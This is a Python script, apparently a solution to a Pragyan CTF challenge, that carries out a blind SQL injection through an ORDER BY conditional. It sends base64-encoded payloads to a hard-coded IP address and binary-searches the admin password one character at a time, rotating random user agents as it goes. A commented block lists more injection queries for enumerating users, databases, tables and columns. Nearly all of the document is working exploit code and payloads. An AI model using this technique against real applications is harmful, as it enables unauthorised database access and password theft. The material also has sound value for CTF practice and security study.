# -*- coding: utf-8 -*-
# @Time    : 2018/3/4 13:36
# @Author  : Superxx
# @File    : test.py
# @Desc    : Prayan ctf 字段盲注脚本


'''
说明：
漏洞语句 select name,age,Experience,Description from users where username='input';
input 为可控输入点， 对 union 进行了过滤 没有对其余字符进行处理
拼凑语句 select name,age,Experience,Description from users where username = '' order by if (statement1，age,Experience) #空格
如果statement1为真，按照age排序，否则按照Experience排序
'''

url_ = 'http://128.199.224.175:24000/'
import base64
import requests
from bs4 import BeautifulSoup
import random

def judge_response(res):
    '''
    根据网页返回结果判断比较结果真假
    :param res:获取的网页结果
    :return: True or False
    '''
    soup = BeautifulSoup(res.content)
    #print str(soup.find_all('div')[-1:])[20:70]
    try:
        if int(str(soup.find_all('div')[-1:])[68]) == 9:
            return True
        else:
            return False
    except:
        return False

#盲注可能会对服务器造成压力，使用随机ua 或者代理池 ，
#TODO添加代理池处理
ua = ['Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0',
      'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H143',
      'mozilla/5.0 (iphone; cpu iphone os 5_1_1 like mac os x) applewebkit/534.46 (khtml, like gecko) mobile/9b206 micromessenger/5.0',
      'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.50',
      'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2 ',
      'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
      'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36',
      'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11',
      'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E) ']

#结果字符串
result_ = ''

#根据判断，该结果长度为36，注意mysql 的返回结果substr 从下标1开始
#采用二分法判断
#判断语句 select ascii(substr((select password from users  where username=\'admin\' ),{0},1))<{1}    {0}是正在比较的字符位置 ，{1}是判断位
for j in range(1, 37):
    start = 1
    end = 128
    while (start != end - 1) and (start != end):
        k = (start + end)/2
        str_ = '\' order by if((select ascii(substr((select password from users  where username=\'admin\' ),{0},1))<{1}),age,Experience) # '.format(j,k)
        #该题对输入做base64加密处理，同处理
        data = {'spy_name': base64.b64encode(str_)}
        res = requests.post(url_, data, headers={'User-Agent': ua[random.randint(0,9)]})
        if judge_response(res):
            end = k
        else:
            start = k

    print chr(start),
    result_ = result_ + chr(start)
    print result_
    j = j + 1

'''
#使用正则表达式对字符串进行穷举判断 select user() regexp \'^PCTF@LOCALHO{0}\'
# ^匹配开头 $匹配结束
# select user() 查询用户
# select database() 查询数据库
# select length(database())={0} 长度判断，注意：有可能是两位或者以上
# select strcmp((select database()),'spy_database')=0 进行字符串比较，如果 相等返回0 
# ascii(substr((select count(*) from information_schema.tables where table_schema=0x7370795F6461746162617365 ),1,1))={0}  枚举该数据库有多少张表
# select ascii(substr((select table_name from information_schema.tables where table_schema=0x74657374 limit 0,1),1,1)) > 115  枚举该数据库第一张表名
# limit x,y  是从第x个开始，y个
# select ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),1,1))>104 枚举该表第一个字段名
# select substr((select length(email) from users  where username=\'admin\' ),1,1 ) = {0}  求字段长度
for i in range(35, 128):
    str_ = '\' order by if((select user() regexp \'^PCTF@LOCALHO{0}\'),age,Experience) # '.format(chr(i))
    data = {'spy_name': base64.b64encode(str_)}
    res = requests.post(url_, data)
    soup = BeautifulSoup(res.content)
    print str(chr(i)) + '---'+ str(soup.find_all('div')[-1:])[20:70]
'''




